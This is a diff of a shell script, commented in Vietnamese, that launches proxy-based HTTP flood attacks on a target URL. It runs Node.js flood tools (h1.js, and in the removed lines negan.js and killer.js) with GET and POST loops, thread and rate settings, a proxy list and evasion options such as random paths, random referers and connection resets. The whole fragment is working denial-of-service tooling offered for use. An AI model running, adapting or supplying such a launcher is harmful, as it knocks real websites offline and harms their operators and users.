@@ -29,22 +29,11 @@ echo "Tổng sau lọc: $(wc -l < live.txt) | IP duy nhất: $(awk -F: '{print $
 rm -f "$tep_tam"
 wait
 
-# Chạy tấn công với negan.js
-for method in GET POST; do 
-  node negan.js -m "$method" -u "$URL" -s "$TIME" -t 8 -r 128 -p live.txt --full true --delay 1 -d false &
-done
-
 # Chạy tấn công với h1.js
 for method in GET POST; do 
   node h1.js "$method" "$URL" live.txt "$TIME" 128 8 randomstring=true &
 done
 
-# Chạy tấn công với killer.js
-for method in GET POST; do 
-  node killer.js "$method" "$URL" "$TIME" 8 128 live.txt \
-    --query 1 --delay 1 --referer rand --http mix \
-    --close --randpath --parsed --reset --multipath 5 &
-done
 
 
 wait
